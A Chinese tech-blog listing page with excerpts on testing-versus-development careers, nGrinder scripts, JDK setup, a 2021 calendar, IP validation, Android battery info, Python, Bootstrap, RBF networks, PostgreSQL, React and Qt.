【软件测试】： 软件测试的发展史相对于软件开发来看，相对来说是不太成熟的，尤其是在中国。从很多猎头招聘网站来看，想招一个10年左右测试经验的人，很难。原因是真正意义上软件测试的兴起基本上在2000年左右才开始。发展到今天，软件测试从业人员和软件开发从业人员的比例相比国外成熟的1：1的比例还是相差甚远。所以相对来说，竞争的压力相对较小。严格意义上来说，软件测试在中国的情况，还是乱世，所以乱世出英雄。另外，很多企业已经意识到软件测试对于软件质量的重要性，很多的软件事故迫使企业真正思考测试的核心价值。所以客观上也导致了，软件测试需求在增加，虽然对测试工程师的要求越来越高。
【软件开发】： 软件开发的发展史相比软件测试来看，相对来说还是比较成熟的，虽然相比印度等软件大国来看，远不如别人成熟。软件开发在2000年左右的时候很火，曾经有一句口号是“学好C++，走遍深圳都不怕”。当时的深圳严重缺少C++人才。但现在市面上其实不缺少初级的开发工程师了。因为初级的已经相对饱和了。另外做开发，如果3年时间内都只是做编码的工作，也会遇到职业瓶颈。另外从学习的角度来看，开发平台和语言的更新相比测试平台还是要快一点。所以客观意义上也导致软件开发的压力大些。另外在同一个企业里面，正常来讲，开发加班会比测试加班要多。
七、【职业发展】 关于职业发展，其实测试与开发的职业发展在有些方面是一致的，比如将来都可以往管理方向发展，也都可以考虑往需求分析方面发展。甚至也都可以往咨询和培训服务方面发展。这些是他们的共同点。
【软件测试】： 前面讲到过，软件测试从综合素质，知识结构等角度来看，要求比软件开发要更全面，这也直接导致了，软件测试的职业发展路线要广于软件开发，在测试技术领域，可以从测试执行工程师、测试设计工程师、测试系统工程师、测试架构工程师、测试专家这个道路晋升，也可以走比如自动化测试、测试开发、性能测试、易用性测试、安全性测试等专项。另外从管理的领域来看，可以从普通测试工程师，测试项目经理、测试主管、测试经理、测试总监、大部门测试总监等晋升。另外从外围IT职业，测试还可以走行业测试专家，比如金融领域测试专家，项目管理、软件测试咨询与培训等、软件质量保证（SQA）、软件销售、技术支持等只要是IT领域的职位都行。
【软件开发】： 软件开发的职业发展其实也比较广泛，在开发技术领域，可以从软件编码、软件设计与架构、软件需求等领域晋升。也可以从普通开发工程师、开发项目经理、开发经理、开发总监或者研发总监等晋升。另外也可以转型来做测试，通过学习测试关键技术，来做测试领域的测试开发。但从外围IT职业，开发相比测试能走的相对还是要窄些，很难走行业专家，除非先走需求分析，最后走行业专家。
八、【职业前景】 严格意义上来讲，软件开发和软件测试都有非常不错的职业前景。因为IT服务人类，IT改变人们的生活方式，IT对于现代社会而言非常重要。但从历史的角度来看，软件测试与软件开发的职业前景还是有一些区别的。
【软件测试】： 无论从行业现状，软件测试的重要性，以及软件测试发展史来看，至少在可以预见的未来10年时间内，整个软件测试行业应该会处于蓬勃发展这样一个生命周期中。因为一项职业从孕育、发展、成熟、稳定需要一定的时间来承载。这点，大家也可以从一些官方的数据来看到。
【软件开发】： 从相对于生命周期来看，软件开发早已经不是以前很多企业只是关注把软件做出来，就像现在要做出一个类似于淘宝的电子商城，其实从功能上，从代码实现上来看，已经很成熟了，花几千块可以买现成的模板，定制下，就可以。所以开发模式在改变，工厂化，模块化思想已经很成熟。所以将来的软件开发一定会关注，个性化、差异化。从这个意义上来看，软件开发的职业前景会受到需求的影响。另外，从行业资讯来看，比较新的开发技术会得到关注。老的慢慢会淡化。
总体而言，如果非得要在软件开发和软件测试做一个结论性的比较，还是比较困难的，所以给每一位看到此文章的人一个建议，如果你很难选择把哪个作为自己的职业来思考。就强烈建议你可以问下这两个领域资深的人，他们的建议对于你来说应该比较关键。
另外，清楚地问下如下几个问题：
1、你的优点是什么？缺点是什么？
2、你想做什么样的工作？你能做什么样的工作？
3、有哪些事情是一定要靠自己的，有哪些事情是一定要借助外力。
所以，有时我们不仅仅是要埋头干活，也需要抬头看路，另外，人生没有捷径可走，但要懂得借势而上。如果你对你的职业不满意，转行是一种选择，树挪死，人挪活。只是在挪的时候，分析下自己，因为你可以改变你自己。分析下外部的环境，因为你需要去适应环境。
身为一名IT技术人员磨练自己的技术是必不可少的，欢迎加入测试交流群（313782132），可以与大牛在线随时讨论自己感兴趣的话题，让自己用最少的时间学到最多的东西。
在此基础上，可以进行一些可靠性，容错性，兼容性等用例的设计，测试下软件的稳定性。
点击我，加入我们吧！群内有许多来自一线的技术大牛，也有在小厂或外包公司奋斗的码农，我们致力打造一个平等，高质量的软件测试交流圈子，不一定能短期就让每个人的技术突飞猛进，但从长远来说，眼光，格局，长远发展的方向才是最重要的。
35岁中年危机大多是因为被短期的利益牵着走，过早压榨掉了价值，如果能一开始就树立一个正确的长远的职业规划。35岁后的你只会比周围的人更值钱
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d239cda34f7218397e357549b13590f/" rel="bookmark">
			Ngrinder脚本开发各细节锦集-各种函数方法（groovy）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		转载：https://www.cnblogs.com/xidianzxm/p/11602120.html
Ngrinder脚本开发各细节锦集（groovy） Ngrinder脚本开发各细节锦集（groovy） 1、生成随机字符串（import org.apache.commons.lang.RandomStringUtils）
数字：RandomStringUtils.randomNumeric(length); 字母：RandomStringUtils.randomAlphabetic(length); 字母加数字：RandomStringUtils.randomAlphanumeric(length); 所有ASCCII字符：RandomStringUtils.randomAscii(length); 自定义混合字符：RandomStringUtils.randomAscii(length, string); 2、生成随机数字：（import java.util.concurrent.ThreadLocalRandom;）
数字：int random_number = ThreadLocalRandom.current().nextInt(min_num, max_num); 3、获取项目数据文件路径
common项目："/resources/account.txt" maven项目：Thread.currentThread().getContextClassLoader().getResource("/account.txt").getPath(); maven项目获取文件内容：ReflectionUtils.getCallingClass(0).getResourceAsStream("/account.txt").getText("UTF-8") 4、读取文件：
txt每行单数据： String[] file_arrary = new File("/resources/account.txt") as String[]; String file_data = file_arrary[arrary_index]; txt每行双数据： String[] file_arrary = new File("/resources/account.txt") as String[]; String data_one = file_arrary[arrary_index].split(",")[0]; String data_two = file_arrary[arrary_index].split(",")[1]; 另一种方法： List&lt;String&gt; reqDataArrList = new File(dataFilePath).readLines() String data_one = reqDataArrList.get(arrary_index).split(",")[0]; String data_two = reqDataArrList.get(arrary_index).split(",")[1]; txt每行多数据可参考双数据方法。也可以参考json方式存储： BufferedReader txt_content=new BufferedReader(new FileReader(new File("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1d239cda34f7218397e357549b13590f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/3a2e5b0723789062fbc1ed5638713a34/" rel="bookmark">
			JDK配置环境变量不生效的一种解决方案
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		安装JDK并配置环境变量后，发现没有生效。
JDK安装与环境变量配置
尝试着用网上的方法去解决，但状况不一致，无从下手。
安装jdk后，自己配置环境变量不起作用的问题
在环境变量里没有找到文章中提到的两个路径，在 C:\Windows\System32目录下也没有找到java.exe,javaw.exe,javaws.exe。
看文章中讲解JDK运行的原理，如下：
猜想会不会系统只是在C:\Windows\System32下找了下文件，没找到就停止了，并没有在其他的配置路径中去找文件？寻找文件的顺序会不会和配置的顺序有关？
于是尝试了下把新配置的JAVA路径移到最上面：
然后问题就这样解决了……
所以如果JDK环境变量正确配置之后却没有生效，你可以试一下把配置的路径写在最前面！
原文链接：https://blog.csdn.net/joker_zsl/article/details/104446404?utm_medium=distribute.wap_relevant.none-task-blog-title-3
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ce1eabd5cfb66ee0091a5fc4222eeec/" rel="bookmark">
			日历2021年日历表|2021年日历表打印版 Excel版
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2021年即将到来，日历设计师们又要开始日历的制作了，众所周知，农历与阳历是不同的，可很多年轻人往往分不清农历和阳历有什么不同，为此小编特为广大用户带来了日历2021年日历表，其中包含阴阳历、节日、二十四节气等，主要通过Excel格式来直观的展示日历的所有信息。该日历表中所有重大事件，以及周末都用红色进行标注了，一目了然，而且该可以直接进行A4打印，上班族查看起来非常方便，可以提前安排好出游计划，2021年日历表打印版是我们生活中必不可少的东西，有需要的小伙伴们快来下载使用吧。
2021年是什么年
2021是牛年，即辛丑年，为阳历 2021年2月12日-2022年1月31日
2021是牛年，此年出生的人为属牛；十二地支为：丑；合称丑牛。
十二生肖是十二地支的形象化代表，即子（鼠）、丑（牛）、寅（虎）、卯（兔）、辰（龙）、巳（蛇）、午（马）、未（羊）、申（猴）、酉（鸡）、戌（狗）、亥（猪）。
农历辛丑年（牛年），无闰月，共354天，春节是2月12日。21世纪第3个10年的开端或第2年，匹配1年计算或0年代计算，2020年代的第2年，中华人民共和国成立72周年，中国共产党成立100周年。
属牛人在2021年的性格
今年是辛丑年，了解到有辛金食神，代表自由，表现，能力，才华和艺术细胞。食神也代表享受和美食，旅行，游玩。
另外，在2021年太岁丑土作为华盖星，这个和佛教和名利有点缘分，可以说，会让属牛人在今年无意间学习到这类的东西，还有对超自然和神秘学也很感兴趣。
丑土，代表冷静和务实，在占有欲和控制的欲望方面比较强，如果是男孩女孩来分析，可看出男孩欲望强，女孩的话，则控制欲强。
属牛人在2021年的事业
今年对属牛人来说，食神星旺，可看出自己的能力表现的很好，尤其在自己的才华和艺术有不错的发挥，也就是金融业，也有可能搞艺术的发挥不错，容易弄到金钱，另外，在收藏古董类型的行业也可得到了销售的不错获利，让今年的后货还是不错的，属牛人在今年的自身存款能力还是比较强大，也可尝试下水产行业，因为在2021年太岁丑土中的
癸水力量并不弱。
属牛人在2021年的财运
今年的地支和天干相遇，达到了食神可生偏财，主动到发财，而且，属牛人天生就懂得理财，自身带偏财的命格，所以，如果在玩耍的其间也能够找到如何有财的方法，也可根据到自身的事业程度去看，属牛人喜欢做的事情，都可改善到赚到钱的行业，所以财运在今年不会太差。
2021年法定节假日安排
1、元旦：1月1日，星期五，农历十一月十八。
元旦放假时间：1月1日——3日。
2、春节：2月12日，星期五，农历正月初一。
春节放假时间：2月11日——2月17日。
3、清明节：4月4日，星期日，农历二月廿三。
清明节放假时间：4月3日——4月5日。
4、五一劳动节：5月1日，星期六，农历三月二十。
五一劳动节放假时间：5月1日——5月3日。
5、端午节：6月14日，星期一，农历五月初五。
端午节放假时间：6月12日——6月14日。
6、中秋节：9月21日，星期二，农历八月十五。
中秋放假时间：9月21日
7、国庆节：10月1日，星期五，农历八月廿五。
国庆放假时间：10月1日——7日。
历法分类
日历中的历法又分为阴历、阳历和阴阳合历，三种。
阳历亦即太阳历，其历年为一个回归年，现时国际通用的公历（格里高利历）和中国的干支历即属于太阳历这类。
阴历亦称月亮历，或称太阴历，其历月是一个朔望月，历年为12个朔望月，其大月30天，小月29天，伊斯兰历即为阴历的一种。
阴阳历的有非常明显的平年和闰年之分，年天数差异较大，历月为朔望月，因为12个朔望月与回归年存在一定的差别（少11天左右），所以阴阳历中设置闰月，用以协调回归年和朔望月之间的关系，存在闰月的年份中一年为十三个月（朔望月），是闰年。一般每经过十九年就会有七个闰年。区别于一年有十二个朔望月的平年。因此这种历法即与月相相符又与地球绕太阳周期运动相符合。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4dd5ed6f6d2c34842686ef8df79da0db/" rel="bookmark">
			判定IP地址合法性的三种方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		IP IP合法性校验是开发中非常常用的，看起来很简单的判断，作用的确很大，写起来比较容易出错，今天我们来总结一下，看一下3种常用的IP地址合法性校验的方法。
IPv4的ip地址格式：（1~255）.（0~255）.（0~255）.（0~255）
正则表达式判定法
最简单的实现方法是构造一个正则表达式。判断用户的输入与正则表达式是否匹配。若匹配则是正确的IP地址，否则不是正确的IP地址。
下面给出相对应的验证ip的正则表达式：
^(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|[1-9])\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)\.(1\d{2}|2[0-4]\d|25[0-5]|[1-9]\d|\d)$ \d表示0~9的任何一个数字
{2}表示正好出现两次
[0-4]表示0~4的任何一个数字
| 的意思是或者
1\d{2}的意思就是100~199之间的任意一个数字
2[0-4]\d的意思是200~249之间的任意一个数字
25[0-5]的意思是250~255之间的任意一个数字
[1-9]\d的意思是10~99之间的任意一个数字
[1-9])的意思是1~9之间的任意一个数字
\.的意思是.点要转义（特殊字符类似，@都要加\\转义）
代码如下：
字符串拆解法 把ip地址当作字符串，以.为分隔符分割，进行判断
引入IPy类库 IPy库是一个处理IP比较强大的第三方库。涉及到计算大量的IP地址，包括网段、网络掩码、广播地址、子网数、IP类型等别担心，Ipy模块拯救你。Ipy模块可以很好的辅助我们高效的完成IP的规划工作。
IPy库的安装方法请根据自己的操作系统自行查找，有很多详细例子。
总结
这几种方法都能够准确的判断出ip（IP V4）地址的合法性， 正则表达式代码量少， 逻辑简单， 但是正则表达式繁琐， 字符串判定法容易理解，但是代码量大， 使用类库，判断简洁，但是需要引入额外的库。各有利弊， 使用时自行选择即可。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64768f0fd167b3902b7dff2b3266806e/" rel="bookmark">
			有没有办法找回testflight之前测试的软件_手机照片不小心误删了，如何才能恢复找回呢？...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当你的手机照片误删以后，你会怎么处理？下面交给你一个方法，怎么处理照片误删的情况。一起来看看吧
操作步骤：
1、当你的手机里照片误删的时候，首先第一件事你就可以去手机相册里看看30天删除里面有没有。一般现在的智能手机都是有这个功能的，30天照片还原。
2、这一张照片就是我之前误删的照片，混在了已经删掉的照片一起。还有期限，30天一完，这张照片就会删除掉。
3、选择下面的恢复，就可以还原在手机相册里。之后直接在相册中就可以找到这张照片。
方法二：可以借助第三方恢复软件
【零点大师】是零点恢复旗下专业做隐私保护及数据恢复的，已成功帮百万用户找回数据，保护隐私，经过零点，恢复恢复数据的概率高达95%，堪称国内顶尖。零点，恢复的工程师有着资深的数据恢复经验，根据恢复的原理反其道而行之，找出保护隐私的办法。具体情况给出具体的解决方案，一对一的专业服务。
关注公众号“零点恢复”了解更多其它手机技巧，可直接下载APP“零点大师”同时也可直接联系客服咨询相关问题，帮您排忧解难！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e4103d00645108a0b752d97b1985b836/" rel="bookmark">
			oppo手机工程模式清除数据需要密码_[MIUI玩机技巧27]如何快速查询和清除电池信息...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 作为安卓手机的用户，不知道你现在的手机的电量使用如何？是不是感觉到手机电量掉的很快？现在智能手机耗电量确实很大，在正常时间的情况下，好像都是不到一天就没电了？好一点的情况一天一充，我基本上都是一天充电2到3次。不知道你没每天为手机充几次电？那么问题来了，我们的手机电池的信息如何直接查看呢？您可能会说通过第三方App检测来查阅，亦或是通过手机自带的诸如【安全中心】里的【电池电量】等来查阅。当然，这些方法一般都是借助于第三方软件来评测手机的电池信息和损耗。 不过，Flashcer今天来给大家分享一种不借助任何第三方App而是直接通过拨号口令就能在手机上可以查看电池的信息的方法。最后，再分享一下如何清除手机的电池信息的方法，不过这个方法需要谨慎使用，有可能导致手机变砖。
▋如何查看电池信息： 1）方法1： 安卓手机只要进入Android的工程测试模式，就可以在手机上直接查看电池信息。 设置方法： 在手机拨号页面输入*#*#4636#*#*，就可以查看电池信息、手机信息、使用情况统计数据、WLAN information等。其中包括电量等级、电量技术、电池状态、电池温度、电池电压等信息。
2）方法2： 如果在Android的工程测试模式下查询不了电池信息，还可以直接去 【安全中心】里查询。
设置方法：
点击【省电优化】即可，不过这里查询的电池信息，相对工程模式有所简化，不过也能查询到电量等级、电池状态、电池温度、电池电压等信息。
▋ 如何清除手机电池信息： 1） 首先，系统必须是MIUI 开发版，进入【安全中心】获取root权限后，再解锁系统分区。 2） 下载RE文件管理器， 删除 /data/system 文件夹中 batterystats.bin 文件（最好把电用到不能开机，关机再充满电后，然后开机进行删除）。
温馨提示： 上述操作，如果操作不当手机可能变成砖机或者卡米等，所以需要备份手机数据再三思而行。 欢迎评论区留言，给出您宝贵的意见或者使用过程中遇到的问题，共同交流！ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e18956fcf5cfb42773666d53941a64b0/" rel="bookmark">
			C语言：字符串赋值给字符数组
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一个字符串可以赋值给一个字符数组，只要不定义这个字符数组的长度就行
例如：
char a[]=“Hello”
此时存在数组里面，也是一个字符一个位，不包括双引号
如果要输出时
就用strlen（）计算数组的长度
然后用个for循环输出
注意
strlen()要include &lt;string.h&gt;的头文件里
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c7c72839b4c83bbfb6e593583a29ce63/" rel="bookmark">
			Python-function函数的基本使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 定义一个函数 使用方法相比java 方法 简单 # 因为是解释型语言 所以方法函数这些就尽量写在前面 # def 函数名称(形参,形参...): # 函数体 # return xxxx 如果需要返回数据 def print_poetry(): print("床前明月光") print("疑似地上霜") print("举头望明月") print("疑似地上霜") return "李白" author = print_poetry() print("作者是{name}".format(name=author)) # 函数设置默认值 与 关键字传参 # 可以在方法后面添加默认值 但是有默认值的参数必须在没有默认值参数的后面 # 在方法参数多的情况后可以 声明参数的变量 指定该参数对应方法的名称 这样也便于代码的阅读 def health_check(name, height, weight, h, age="13"): print(age) print(height) print("您的健康状况良好") return "okk" print(health_check(name="张三", height="123", weight="123", h="123")) # 在参数多的情况下 觉得有必要对参数进行关键字声明时 可以使用 * 符号进行强制关键字传参 # 如 health_check(name,age,*,height,weight,h) def health_check1(name, age, *, height, weight, h): print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c7c72839b4c83bbfb6e593583a29ce63/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c1b9b38a2eacd86fbfb1e3be4285bfc4/" rel="bookmark">
			Python-序列类型的转换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		# 序列类型的转换 # list() 可以将序列数据转换成列表 List # tuple() 可以将序列数据转换成元组 # Join()/str() 可以将序列数据转换成字符串 l1 = ["a", "b", "c"] t1 = ("d", "e", "f") s1 = "abc123" s2 = "abc,123" # 转换为List print(list(t1)) print(list(s1)) print(s2.split(",")) print(" ") print("==" * 50) # 转换为元组 与上诉方式一样的 print(tuple(l1)) print(tuple(s1)) print(tuple(s2.split(","))) print(" ") # 转换成str # str() join() # str 单纯把打印的值或者数字转换成字符串 # join 把序列数据通过糅合在一起 （需要注意在使用Join转换list时 list中不能包含数字 数字不能直接相加） # "".join(str) 其中前面"" 为list 序列之间的分隔符 "" 理解为直接相加 print("".join(l1)) print("".join(t1)) print("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c1b9b38a2eacd86fbfb1e3be4285bfc4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c51bbc8648a6aa3a2afe50f135fe9217/" rel="bookmark">
			bootstrap框架   基础样式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		引入下载的css和js。
或者：
&lt;!-- 新 Bootstrap4 核心 CSS 文件 --&gt;
&lt;link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css"&gt;
&lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt;
&lt;script src="https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"&gt;&lt;/script&gt;
&lt;!-- bootstrap.bundle.min.js 用于弹窗、提示、下拉菜单，包含了 popper.min.js --&gt;
&lt;script src="https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"&gt;&lt;/script&gt;
&lt;!-- 最新的 Bootstrap4 核心 JavaScript 文件 --&gt;
&lt;script src="https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"&gt;&lt;/script&gt;
容器
1.流体容器： width：auto
2.固定容器：
阈值： width
大于等于1200(lg大屏pc) 1170 (1140+槽宽
大于等于992(md中屏pc) 970 (940+槽宽)
小于1200大于等于768(sm平板) 750 (720+槽宽)
小于992 小于768(xs移动手机) auto
行：row 两侧-15px margin
类名以？开头：
3.栅格系统
栅格源码分析
1.流体容器&amp;固定容器公共样式
margin-right: auto;
margin-left: auto;
padding-left: 15px;
padding-right: 15px;
2.固定容器特定样式
顺序不可变
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c51bbc8648a6aa3a2afe50f135fe9217/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ef64b92cc2f33edf121770e09e36651f/" rel="bookmark">
			RBF神经网络理论与实现
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 最近发现有挺多人喜欢径向基函数(Radial Basis Function,RBF)神经网络，其实它就是将RBF作为神经网络层间的一种连接方式而已。这里做一个简单的描述和找了个代码解读。
之前也写过一篇，不过排版不好看，可以戳这里跳转
国际惯例，参考博客：
维基百科径向基函数
《模式识别与智能计算——matlab技术实现第三版》第6.3章节
《matlab神经网络43个案例分析》第7章节
tensorflow2.0实现RBF
numpy的实现
理论 基本思想 用RBF作为隐单元的“基”构成隐藏层空间，隐藏层对输入矢量进行变换，将低维的模式输入数据变换到高维空间内，使得在低维空间内的线性不可分问题在高维空间内线性可分。
详细一点就是用RBF的隐单元的“基”构成隐藏层空间，这样就可以将输入矢量直接(不通过权连接)映射到隐空间。当RBF的中心点确定以后，这种映射关系也就确定 了。而隐含层空间到输出空间的映射是线性的(注意这个地方区分一下线性映射和非线性映射的关系)，即网络输出是隐单元输出的线性加权和，此处的权即为网络可调参数。
径向基神经网络的节点激活函数采用径向基函数，定义了空间中任一点到某一中心点的欧式距离的单调函数。
我们通常使用的函数是高斯函数：
ϕ ( r ) = e − ( ϵ r ) 2 \phi(r) = e^{-(\epsilon r)^2} ϕ(r)=e−(ϵr)2
在《Phase-Functioned Neural Networks for Character Control》论文代码中有提到很多径向基函数：
kernels = { 'multiquadric': lambda x: np.sqrt(x**2 + 1), 'inverse': lambda x: 1.0 / np.sqrt(x**2 + 1), 'gaussian': lambda x: np.exp(-x**2), 'linear': lambda x: x, 'quadric': lambda x: x**2, 'cubic': lambda x: x**3, 'quartic': lambda x: x**4, 'quintic': lambda x: x**5, 'thin_plate': lambda x: x**2 * np.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ef64b92cc2f33edf121770e09e36651f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ae373fc26187d7a2766952caf34c3ce3/" rel="bookmark">
			PostgreSQL查询账号所拥有的表权限
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 # 查账号所拥有的权限 select * from INFORMATION_SCHEMA.role_table_grants where grantee='pay_rd'; # 或者 select * from information_schema.table_privileges where grantee='pay_rd'; 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b3231655cebb7a1f783eddf27d254ca/" rel="bookmark">
			super
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		react中的super
1、为什么一定要在constructor中调用super
答案：如果一个子类，通过extends关键字继承父类，那么，在子类的constructor构造函数中，必须优先调用一下super()
2、super是什么东西
答案：super是一个函数，而且，它是父类的构造器，子类中的super，其实就是父类中construct构造器的一个引用
3、为什么调用super()之后，p中的name和age变成了undefined
class Hello extends React.Component{ constructor(name,age){ super() this.name = name this.age = age } } const p = new Hello('terry',23) console.log(p) ===========================
super关键字即可做函数使用，也可做对象使用，两种情况，用法完全不同
constructor 是一种用于创建和初始化class创建的对象的特殊方法。
（1）super做函数使用
class A { constructor() { console.log(new.target.name); // new.target 指向当前正在执行的函数 } } class B extends A{ constructor(){ //构造函数 super() //es6要求，子类的构造函数必须执行一次super()函数，否则会报错 } } new A() //A new B() //B 注意：在constructor中必须调用super方法，因为子类没有自己的this对象，而是继承父类的this对象
super代表父类的构造函数，但返回子类的实例，即super内部的this指向B
所以，super()在这里相当于A.prototype.constructor.call(this, props)
(2)当对象使用
1）在普通方法中，指向父类的原型对象；在静态方法中，指向父类。
class A { c() { return 2; } } class B extends A { constructor() { super(); console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1b3231655cebb7a1f783eddf27d254ca/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bcf51c9db5cb5cc405d9f4c30f2564c/" rel="bookmark">
			错误代码:com.netflix.discovery.AbstractDiscoveryClientOptionalA
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		报错代码:
java.lang.IllegalStateException: Failed to introspect Class [org.springframework.cloud.netflix.eureka.config.DiscoveryClientOptionalArgsConfiguration] from ClassLoader [jdk.internal.loader.ClassLoaders$AppClassLoader@2437c6dc] at org.springframework.util.ReflectionUtils.getDeclaredMethods(ReflectionUtils.java:481) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.util.ReflectionUtils.doWithMethods(ReflectionUtils.java:358) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.util.ReflectionUtils.getUniqueDeclaredMethods(ReflectionUtils.java:414) ~[spring-core-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.lambda$getTypeForFactoryMethod$2(AbstractAutowireCapableBeanFactory.java:742) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at java.base/java.util.concurrent.ConcurrentHashMap.computeIfAbsent(ConcurrentHashMap.java:1705) ~[na:na] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.getTypeForFactoryMethod(AbstractAutowireCapableBeanFactory.java:741) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.determineTargetType(AbstractAutowireCapableBeanFactory.java:680) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.predictBeanType(AbstractAutowireCapableBeanFactory.java:648) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.AbstractBeanFactory.isFactoryBean(AbstractBeanFactory.java:1614) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.doGetBeanNamesForType(DefaultListableBeanFactory.java:523) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.beans.factory.support.DefaultListableBeanFactory.getBeanNamesForType(DefaultListableBeanFactory.java:495) ~[spring-beans-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.context.support.PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(PostProcessorRegistrationDelegate.java:100) ~[spring-context-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.context.support.AbstractApplicationContext.invokeBeanFactoryPostProcessors(AbstractApplicationContext.java:707) ~[spring-context-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:533) ~[spring-context-5.2.8.RELEASE.jar:5.2.8.RELEASE] at org.springframework.boot.web.servlet.context.ServletWebServerApplicationContext.refresh(ServletWebServerApplicationContext.java:143) ~[spring-boot-2.3.3.RELEASE.jar:2.3.3.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:758) ~[spring-boot-2.3.3.RELEASE.jar:2.3.3.RELEASE] at org.springframework.boot.SpringApplication.refresh(SpringApplication.java:750) ~[spring-boot-2.3.3.RELEASE.jar:2.3.3.RELEASE] at org.springframework.boot.SpringApplication.refreshContext(SpringApplication.java:397) ~[spring-boot-2.3.3.RELEASE.jar:2.3.3.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:315) ~[spring-boot-2.3.3.RELEASE.jar:2.3.3.RELEASE] at org.springframework.boot.SpringApplication.run(SpringApplication.java:1237) ~[spring-boot-2.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bcf51c9db5cb5cc405d9f4c30f2564c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b16d9472c869683ef4517b0810d4468a/" rel="bookmark">
			C&#43;&#43;学习（一五三）如何安装qt调试库pdb
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		以qt5.12为例，安装包里没有调试库，如果要安装调试库有两种方式，一种是使用安装目录下的MaintenanceTool工具，一种是使用在线安装器MaintenanceTool
一、使用MaintenanceTool工具来安装
1、打开
2、设置存储库
https://download.qt.io/online/qtsdkrepository/windows_x86/desktop/qt5_5120
3、选中调试库进行安装
注意一定要全选，没有被选中的会执行删除操作。
二、使用在线安装器安装
